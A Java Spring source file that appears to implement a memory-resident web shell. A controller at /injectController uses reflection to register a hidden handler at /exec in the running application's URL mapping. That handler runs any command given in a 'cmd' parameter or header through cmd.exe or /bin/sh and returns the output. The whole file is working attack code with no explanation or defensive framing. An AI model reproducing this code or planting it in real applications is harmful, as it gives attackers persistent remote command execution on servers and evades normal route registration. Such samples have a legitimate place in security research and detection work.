package com.DemoSpring;

import com.Utils;
import org.springframework.lang.Nullable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping;
import org.springframework.web.servlet.mvc.Controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.util.Map;
import java.util.Scanner;

/**
 * https://party.mem.mk/ui
 * SpringWebMvc-Command-ControllerHandler
 */
@RestController
public class injectController {
    @RequestMapping("/injectController")
    public String inject(){

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        Object o = context.getBean(BeanNameUrlHandlerMapping.class);

        String urlPattern = "/exec";
        evalController evalController = new evalController();

        try {
            Map m = (Map) Utils.getField(o ,"handlerMap");
            if (m.get(urlPattern) == null) {
                m.put(urlPattern ,evalController);
            }
            return "success";

        } catch (Exception e) {
            throw new RuntimeException(e);
        }


    }
}
class evalController implements Controller{

    public static String paramName = "cmd";
    @Nullable
    @Override
    public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception {
        try {
            String parameter = httpServletRequest.getParameter(paramName);
            if (parameter == null || parameter.isEmpty()) {
                parameter = httpServletRequest.getHeader(paramName);
            }
            if (parameter != null) {
                httpServletResponse.getWriter().write(new Scanner(getInputStream(getParam(parameter))).useDelimiter("\\A").next());
                httpServletResponse.getWriter().flush();
                httpServletResponse.getWriter().close();
            }
            return null;
        } catch (Throwable th) {
            return null;
        }
    }

    private String getParam(String str) {
        return str;
    }

    private InputStream getInputStream(String str) throws Exception {
        String[] split;
        String str2 = null;
        System.out.println(str);
        if (0 == 0) {
            split = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
        } else if (str2.contains("\"{command}\"")) {
            String[] split2 = str2.split("\\s+");
            for (int i = 0; i < split2.length; i++) {
                split2[i] = split2[i].replace("\"{command}\"", str);
            }
            split = split2;
        } else {
            split = str2.replace("{command}", str).split("\\s+");
        }
        return new ProcessBuilder(split).redirectErrorStream(true).start().getInputStream();
    }
}
